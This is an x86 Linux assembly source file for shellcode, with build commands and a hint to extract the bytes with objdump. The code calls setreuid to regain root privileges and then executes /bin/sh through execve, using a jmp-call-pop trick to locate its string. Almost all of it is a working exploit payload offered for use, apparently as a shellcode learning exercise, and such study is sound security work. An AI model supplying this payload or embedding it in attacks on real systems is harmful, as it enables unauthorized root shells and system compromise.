; Executable name : abatchy-shell
; Designed OS     : Linux
; Version         : 1.0
; Origin          : http://www.vividmachines.com/shellcode/shellcode.html
; .data trick     : https://www.exploit-db.com/papers/13224/
; Description     : This code attempts to set root privledges if they are dropped
;		    and then spawns a shell.
;
; Build using these commands:
;	nasm -f elf abatchy-shell.asm
;	ld -o abatchy-shell abatchy-shell.o
;
; Extract shellcode using:
;	objdump -D abatchy-shell

SECTION .data			; .text is read-only so we store it in .data

global _start

_start:
	xor eax,eax		; zero out
	xor ebx,ebx		; ^
	xor ecx,ecx		; |
	mov al,70		; syscall 70 is setreuid
	int 80h			; call kernel

	jmp short do_call	; make a short jump to msg

jmp_back:
	pop ebx			; ebx has the address of our string, use it to index
	xor eax,eax		; zero out
	mov [ebx+7],al		; put a null at the N aka shell[7]
	mov [ebx+8],ebx		; put the address of our string (in ebx) into shell[8]
	mov [ebx+12],eax	; put the null at shell[12]
	xor eax,eax		; zero out
	mov al,11		; execve is syscall 11
	lea ecx,[ebx+8]		; put the null at shell[12]
	lea edx,[ebx+12]	; put the address of YYYY aka (*0000) into edx
	int 80h			; call kernel, WE HAVE A SHELL!

do_call:
	call jmp_back		; go-to jmp_back
	db '/bin/shNXXXXYYYY'	; string
